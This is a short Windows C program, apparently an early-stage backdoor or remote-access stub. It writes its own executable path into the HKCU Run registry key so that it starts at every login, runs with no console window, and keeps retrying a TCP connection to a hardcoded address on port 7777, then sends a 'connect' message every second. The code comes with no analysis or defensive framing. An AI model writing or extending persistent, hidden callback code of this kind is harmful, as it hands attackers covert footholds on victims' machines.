#include <ws2tcpip.h> 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

WSADATA data;
SOCKET sock;
SOCKADDR_IN adres;

char path[100];
long size = 100;
HKEY hkey = 0;

char welkom[] = "connect";

_stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow){
	HANDLE name = GetCurrentProcess();
	QueryFullProcessImageNameA(name,0,path,&size);
	RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueExA(hkey,"myapp",0,REG_SZ,path,100);
	WORD ver = MAKEWORD(2, 2);
	WSAStartup(ver, &data);
	sock = socket(AF_INET,SOCK_STREAM,0);
 	adres.sin_family = AF_INET;
	adres.sin_port = htons(7777);
	inet_pton(AF_INET,"172.16.164.69",&adres.sin_addr);
	while(connect(sock,(SOCKADDR*)&adres,sizeof(adres))){}
	for(;;){
		send(sock,welkom,sizeof(welkom),0);
		Sleep(1000);
	}
}
